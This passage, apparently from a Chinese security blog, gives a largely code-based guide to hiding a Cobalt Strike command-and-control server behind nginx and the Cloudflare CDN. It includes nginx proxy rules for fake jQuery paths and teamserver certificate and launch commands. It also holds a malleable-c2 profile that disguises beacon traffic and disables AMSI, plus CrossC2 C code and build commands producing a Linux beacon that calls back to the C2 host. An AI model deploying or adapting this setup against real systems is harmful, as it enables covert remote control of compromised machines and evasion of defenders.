keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#流量转发</span>    <span class="token keyword">location</span> <span class="token operator">/</span>jquery<span class="token number">-3.3</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">.</span>slim<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">https</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">location</span> <span class="token operator">/</span>jquery<span class="token number">-3.3</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">.</span>slim<span class="token punctuation">.</span>min<span class="token punctuation">.</span>js <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">https</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">location</span> <span class="token operator">/</span>jquery<span class="token number">-3.3</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token punctuation">.</span>min<span class="token punctuation">.</span>js <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">https</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">location</span> <span class="token operator">/</span>jquery<span class="token number">-3.3</span><span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">.</span>min<span class="token punctuation">.</span>js <span class="token punctuation">{</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">https</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#默认首页</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">root</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token punctuation">;</span>        <span class="token keyword">index</span> <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token keyword">index</span><span class="token punctuation">.</span>htm<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CobaltStrike服务配置"><a href="#CobaltStrike服务配置" class="headerlink" title="CobaltStrike服务配置"></a>CobaltStrike服务配置</h2><p>前置nginx基本配置好了后，接下来进行一些CobaltStrike的配置。主要是证书和profile配置。将压缩包上传到服务器解压后：<br><img src="https://i.loli.net/2021/08/08/G9FqjARPEr1nS8a.png"><br>先用keytool生成证书，这个证书可以用来做为管理端口(默认是50050)或者监听器的端口上的https证书，只要不用默认的随便配置就好：</p><pre class="line-numbers language-cmd?linenums"><code class="language-cmd?linenums">keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 1314520.com -validity 50000 -dname "CN=, OU=1314520.com, O=1314520.com, L=Redmond, S=Washington, C=US"keytool -importkeystore -srckeystore ./cobaltstrike.store -destkeystore ./cobaltstrike.store -deststoretype pkcs12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>编辑启动脚本(Linux下的teamserver或者Windows下的teamserver.bat)中的端口和证书配置密码:</p><pre class="line-numbers language-java?linenums"><code class="language-java?linenums">java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -Xms512m -Xmx1024m -Dcobaltstrike.server_port=5555 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer $*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>简单的Profile配置</strong><br>启动参数调好后，Profile是用的<a href="https://github.com/threatexpress/malleable-c2">malleable-c2</a>，在配置文件中按需修改下面的参数:</p><pre class="line-numbers language-gams"><code class="language-gams">set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"; # 这个改了不要再变，否则上不了线set dns_idle        "8.8.8.8";   #dns的特征修改#header "Content-Type" "application/javascript; charset=utf-8"; #注释默认Type,防止cf缓存<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后启动<code>teamserve vpsip Password Profile</code>，如Linux下：</p><pre class="line-numbers language-bash?linenums"><code class="language-bash?linenums">chmod +x teamserver./teamserver x.x.x.x password malleable-c2/jquery-c2.4.0.profile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>持久化可以将下面的命令写入文件，如start_teamserver,chmod赋予执行权限后，可以方便的使用./start_teamserver启动，停止就用<code>pkill java</code>，脚本如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> ./teamserver x.x.x.x password malleable-c2/jquery-c2.4.0.profile <span class="token operator">></span>/dev/null 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行<code>./start_teamserver</code>后可以尝试链接vps5555端口的teamserver了:<br><img src="https://i.loli.net/2021/08/10/Iaywfv31V6HbgLh.png"></p><p> <strong>CobaltStrike监听器配置</strong><br>进入teamserver后，配置监听器。CDN在HTTPS上会检查SNI用不了域前置(http上可以修改host)，这里使用加速过的域名：<br><img src="https://i.loli.net/2021/08/10/RhiCeKNSg6WPDY5.png"><br>测试上线时会发现执行命令、执行stager不返回的情况，这是因为cdn的缓存原因，到CDN设置页面规则，对js文件绕过缓存：<br><img src="https://i.loli.net/2021/08/10/SiEUeATYO32w9uk.png"><br>配好后清除下缓存：<br><img src="https://i.loli.net/2021/08/10/fdCnIz91qYBpkNS.png"><br>然后测试上线和命令执行返回：<br><img src="https://i.loli.net/2021/08/10/yYZ1pXkCGiOBndm.png"></p><p><strong>Linux和Windows中Profile通用配置</strong><br>有时候我们想使用Crossc2来上线cs,但是我们的windows中配置了profile的，linux无法直接上线，所以需要在Crossc2中配置请求的路径，参考<a href="https://github.com/gloxec/CrossC2/tree/cs4.1/protocol_demo">协议演示</a>：<br>根据demo，准了新的init.profile,init.c<br>init.profile：</p><pre class="line-numbers language-gams"><code class="language-gams">set sample_name "daidaiwoya";set sleeptime "2000";set jitter    "15";set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko";set host_stage "false";set maxdns          "255";set dns_max_txt     "252";set dns_idle        "8.8.8.8"; set dns_sleep       "500"; set dns_stager_prepend ".resources.741256.";set dns_stager_subhost ".feeds.952365.";https-certificate {    set C   "US";    set CN  "jquery.com";    set O   "jQuery";    set OU  "Certificate Authority";    set validity "365";}http-get {    set uri "/getversion";    set verb "GET";    client {        header "Accept" "text/xml";        header "Host" "www.google.com";        header "Referer" "http://www.google.com/";        header "Accept-Encoding" "gzip, deflate";        metadata {            base64url;            prepend "SID=";            header "Cookie";        }    }    server {        header "Server" "nginx";        header "Cache-Control" "max-age=0, no-cache";        header "Pragma" "no-cache";        header "Connection" "keep-alive";        header "Content-Type" "charset=utf-8";        header "X-Cache" "bypass";        output {            base64;            prepend "sign=";            append "5.4.3";            print;        }    }}http-post {    set uri "/kernel.org";    set verb "POST";    client {        header "Accept" "text/xml";        header "Host" "www.google.com";        header "Referer" "http://www.google.com/";        header "Accept-Encoding" "gzip, deflate";        id {            base64;            prepend "__cfduid=";            header "Cookie";        }        output {            base64;            print;        }    }    server {        header "Server" "nginx";        header "Cache-Control" "max-age=0, no-cache";        header "Pragma" "no-cache";        header "Connection" "keep-alive";        header "Content-Type" "charset=utf-8";        header "X-Cache" "bypass";        output {            mask;            base64url;            prepend "sign=";            append "code=2";            print;        }    }}post-ex {    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";    set obfuscate "true";    set smartinject "true";    set amsi_disable "true";}http-config {    set trust_x_forwarded_for "true";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>init.c</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token comment" spellcheck="true">// gcc -shared profile.c -o libprofile.so</span><span class="token comment" spellcheck="true">// ./genCrossC2.Linux 192.168.11.1 8086 null libprofile.so Linux x64 ./shell</span><span class="token keyword">void</span> <span class="token function">cc2_rebind_http_get_send</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>reqData<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//修改请求URL和c2profile文件中一致</span>    <span class="token keyword">char</span> <span class="token operator">*</span>requestBody <span class="token operator">=</span> <span class="token string">"GET /%s HTTP/1.1\r\n"</span>        <span class="token string">"Host: www.google.com\r\n"</span>        <span class="token string">"Accept: text/xml\r\n"</span>        <span class="token string">"Accept-Encoding: gzip, br\r\n"</span>        <span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko\r\n"</span>        <span class="token string">"Cookie: SID=%s\r\n"</span>        <span class="token comment" spellcheck="true">//"Referer: https://www.google.com/\r\n"</span>        <span class="token string">"Connection: close\r\n\r\n"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> postPayload<span class="token punctuation">[</span><span class="token number">20000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">,</span> requestBody<span class="token punctuation">,</span> <span class="token string">"getversion"</span><span class="token punctuation">,</span> reqData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData_len <span class="token operator">=</span>  <span class="token function">strlen</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>  <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> postPayload<span class="token punctuation">,</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">cc2_rebind_http_post_send</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>reqData<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>id<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>requestBody <span class="token operator">=</span> <span class="token string">"POST /%s HTTP/1.1\r\n"</span>        <span class="token string">"Host: www.google.com\r\n"</span>        <span class="token string">"Accept: text/xml\r\n"</span>        <span class="token string">"Accept-Encoding: gzip, br\r\n"</span>        <span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko\r\n"</span>        <span class="token string">"Cookie: __cfduid=%s\r\n"</span>        <span class="token string">"Referer: https://www.google.com/\r\n"</span>        <span class="token string">"Connection: close\r\n"</span>        <span class="token string">"Content-Length: %d\r\n\r\n%s"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>postPayload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>requestBody<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">strlen</span><span class="token punctuation">(</span>reqData<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">,</span> requestBody<span class="token punctuation">,</span> <span class="token string">"kernel.org"</span><span class="token punctuation">,</span> id<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>reqData<span class="token punctuation">)</span><span class="token punctuation">,</span> reqData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData_len <span class="token operator">=</span>  <span class="token function">strlen</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>  <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> postPayload<span class="token punctuation">,</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>postPayload<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">find_payload</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>rawData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> rawData_len<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>start<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>end<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>payload_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//find_payload() 从原始数据中，找到以"ffffffff1"字符串开始，"eeeeeeee2"字符串结束中间包含的数据</span>    <span class="token comment" spellcheck="true">// ffffffff1AAAABBBBCCCCDDDDeeeeeeee2 -> AAAABBBBCCCCDDDD</span>    <span class="token comment" spellcheck="true">// *payload_len = xx; // 返回找到的payload长度</span>    <span class="token comment" spellcheck="true">// return payload; // 返回找到的payload</span>    rawData <span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>rawData<span class="token punctuation">,</span> start<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>payload_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>rawData<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>rawData<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>payload <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token operator">*</span>payload_len <span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> rawData<span class="token punctuation">,</span> <span class="token operator">*</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> payload<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">cc2_rebind_http_get_recv</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>rawData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> rawData_len<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>start <span class="token operator">=</span> <span class="token string">"sign="</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>end <span class="token operator">=</span> <span class="token string">"5.4.3"</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> payload_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData <span class="token operator">=</span> <span class="token function">find_payload</span><span class="token punctuation">(</span>rawData<span class="token punctuation">,</span> rawData_len<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">,</span> <span class="token operator">&amp;</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData_len <span class="token operator">=</span> payload_len<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">cc2_rebind_http_post_recv</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>rawData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> rawData_len<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>outputData<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>outputData_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>start <span class="token operator">=</span> <span class="token string">"sign="</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>end <span class="token operator">=</span> <span class="token string">"code=2"</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> payload_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData <span class="token operator">=</span> <span class="token function">find_payload</span><span class="token punctuation">(</span>rawData<span class="token punctuation">,</span> rawData_len<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">,</span> <span class="token operator">&amp;</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>outputData_len <span class="token operator">=</span> payload_len<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Profile检查:</p><pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">java</span> -XX<span class="token punctuation">:</span>ParallelGCThreads<span class="token operator">=</span><span class="token number">4</span> -Duser<span class="token operator">.</span>language<span class="token operator">=</span>en -XX<span class="token punctuation">:</span><span class="token operator">+</span>UseParallelGC -classpath <span class="token operator">.</span><span class="token operator">/</span>cobaltstrike<span class="token operator">.</span>jar c2profile<span class="token operator">.</span>Lint init<span class="token operator">.</span>profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用profile:</p><pre class="line-numbers language-lsl"><code class="language-lsl">cmd /k teamserver_win.bat 192.168.11.1 123456 init.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在Ubuntu上生成二进制文件：</p><pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">gcc</span> init<span class="token operator">.</span>c -fPIC -shared -o init<span class="token operator">.</span>so</span><span class="token punctuation">.</span>/genCrossC2<span class="token punctuation">.</span>Linux41 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>11<span class="token punctuation">.</span>1 8086 <span class="token punctuation">.</span>cobaltstrike<span class="token punctuation">.</span>beacon_keys init<span class="token punctuation">.</span>so Linux x64 <span class="token punctuation">.</span>/shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/02/wkGnHh1BlFStJub.png"><br>然后执行<code>./shell</code>,成功的返回了beacon:<br><img src="https://i.loli.net/2021/08/02/x81X4CEf3y6uNrg.png"></p><p>2.使用<a href="https://github.com/Richard-Tang/CrossC2-C2Profile">CrossC2-C2Profile</a><br>在github上看到Richard-Tang师傅实现了jquery-c2.4.0.profile的兼容，进行了测试使用(profile日期报错的时候cs启动参数加上 <code>-Duser.language=en</code> )：<br><img src="https://i.loli.net/2021/08/02/rSohkVPEYxjXKBn.png"></p><p>3.Linux在CDN中上线<br>在CrossC2_v2.24中不使用cdn，使用域名可以正常上线；使用cdn后web无日志，无上线；在v2.2.5中使用域名正常上线，但是心跳不稳定，一会就超时了。<br><img src="https://i.loli.net/2021/08/11/t2E8FbaAjlRsYNH.png"></p><h2 id="CDN后获取真实源IP"><a href="#CDN后获取真实源IP" class="headerlink" title="CDN后获取真实源IP"></a>CDN后获取真实源IP</h2><p>1.Cloudflare请求会自带X-Forwarded-For头，在nginx中设置一下X-Forwarded-For标头(不设置容易获取到127.0.0.1)，CobaltStrike需要在profile中开启 X-Forwarded-For 获取，<br>nginx.conf:</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#代理到cs</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>profile设置：</p><pre class="line-numbers language-profile"><code class="language-profile">http-config {set trust_x_forwarded_for "true";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Cloudflare还可以使用标头CF-Connecting-IP来获取真实IP，使用需要开启标头下划线支持，不然不能用这个参数，一般来说使用这个参数获取的比较准确:</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>        <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>        <span class="token keyword">server_name</span>  _<span class="token punctuation">;</span>        <span class="token keyword">access_log</span>  logs<span class="token operator">/</span>cname<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#开启请求中的下划线支持，方便使用自定义的header头</span>        <span class="token keyword">underscores_in_headers</span> on<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">#把CF-Connecting-IP请求头设置为X-Forwarded-For</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$http_cf_connecting_ip</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">#代理到cs</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.在nginx中<code>$remote_addr</code>用来存请求的真实来源IP，一般CDN回源时都会有请求头来记录客户端真实IP(像cf用的上面说的两个，阿里CDN用的Ali-CDN-Real-IP)，nginx记录来源IP的参数是<code>$remote_addr</code>，可以用来在日志中记录IP，使用real_ip_header来设置，比如在Cloudflare中设置<code>$remote_addr</code>真实来源，在server段中配置日志保存格式和路径，可以很方便的对日志进行分别管理查看：</p><pre class="line-numbers language-nginx"><code class="language-nginx"> <span class="token keyword">log_format</span>  main  <span class="token string">'$remote_addr - $remote_user [$time_local] "$request" '</span>                      <span class="token string">'$status $body_bytes_sent "$http_referer" '</span>                      <span class="token string">'"$http_user_agent" "$http_x_forwarded_for"'</span><span class="token punctuation">;</span> <span class="token keyword">server</span> <span class="token punctuation">{</span>         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">server_name</span> www<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token comment" spellcheck="true">#设置信任服务器，CDN的IP段</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">103.21</span><span class="token punctuation">.</span><span class="token number">244.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">103.22</span><span class="token punctuation">.</span><span class="token number">200.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">103.31</span><span class="token punctuation">.</span><span class="token number">4.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">104.16</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">12</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">108.162</span><span class="token punctuation">.</span><span class="token number">192.0</span><span class="token operator">/</span><span class="token number">18</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">131.0</span><span class="token punctuation">.</span><span class="token number">72.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">141.101</span><span class="token punctuation">.</span><span class="token number">64.0</span><span class="token operator">/</span><span class="token number">18</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">162.158</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">15</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">172.64</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">13</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">173.245</span><span class="token punctuation">.</span><span class="token number">48.0</span><span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">188.114</span><span class="token punctuation">.</span><span class="token 